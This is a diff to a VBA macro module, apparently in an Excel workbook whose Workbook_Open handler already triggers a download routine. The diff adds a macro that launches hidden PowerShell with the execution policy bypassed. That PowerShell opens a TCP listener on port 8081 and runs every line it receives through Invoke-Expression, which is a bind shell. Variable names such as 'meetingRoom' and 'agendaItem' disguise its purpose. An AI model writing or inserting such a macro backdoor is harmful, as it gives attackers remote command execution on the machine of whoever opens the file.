@@ -41,3 +41,41 @@ End Sub
 Private Sub Workbook_Open()
     DownloadImageToDesktop
 End Sub 
+
+
+
+Sub RunTcpListenerBusiness()
+    Dim shell As Object
+    Dim psCode As String
+    Dim command As String
+
+    ' PowerShell code as a single line, with semicolons separating statements
+    psCode = _
+        "$meetingRoom=8081;" & _
+        "$receptionist=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,$meetingRoom);" & _
+        "$receptionist.Start();" & _
+        "$guest=$receptionist.AcceptTcpClient();" & _
+        "$conferenceCall=$guest.GetStream();" & _
+        "$minutesTaker=New-Object System.IO.StreamWriter($conferenceCall);" & _
+        "$noteTaker=New-Object System.IO.StreamReader($conferenceCall);" & _
+        "$minutesTaker.AutoFlush=$true;" & _
+        "$minutesTaker.WriteLine('Welcome to the business TCP listener. Type your agenda items:');" & _
+        "while($true){" & _
+        "$agendaItem=$noteTaker.ReadLine();" & _
+        "if($agendaItem -eq 'exit'){break};" & _
+        "try{$actionItems=Invoke-Expression $agendaItem|Out-String}catch{$actionItems=$_.Exception.Message};" & _
+        "$minutesTaker.WriteLine($actionItems)};" & _
+        "$minutesTaker.Close();" & _
+        "$noteTaker.Close();" & _
+        "$guest.Close();" & _
+        "$receptionist.Stop();"
+
+    ' Escape double quotes for command line
+    psCode = Replace(psCode, """", "`""")
+
+    ' Build the PowerShell command
+    command = "powershell.exe -ExecutionPolicy Bypass -Command """ & psCode & """"
+
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run command, 0, False
+End Sub
